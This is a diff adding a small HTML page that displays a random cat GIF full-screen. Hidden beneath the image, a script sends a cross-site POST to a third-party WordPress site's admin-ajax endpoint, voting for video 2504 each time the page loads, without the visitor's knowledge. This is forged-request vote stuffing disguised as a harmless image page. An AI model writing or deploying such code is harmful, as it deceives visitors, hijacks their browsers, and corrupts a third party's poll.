@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html, body{
+  margin: 0;
+  height: 100%;
+  overflow: hidden;
+}
+
+img {
+  min-height: 100%;
+  min-width: 100%;
+  height: auto;
+  width: auto;
+  position: absolute;
+  top: -100%; bottom: -100%;
+  left: -100%; right: -100%;
+  margin: auto;
+}
+</style>
+</head>
+
+<body>
+<img src="http://thecatapi.com/api/images/get?format=src&type=gif">
+
+<script>
+var DATA = 'action=vote_for_video&video_id=2504'
+
+var http = new XMLHttpRequest()
+http.open('POST', 'http://www.classicrockitalia.it/wp-admin/admin-ajax.php', true)
+http.send(DATA)
+</body>
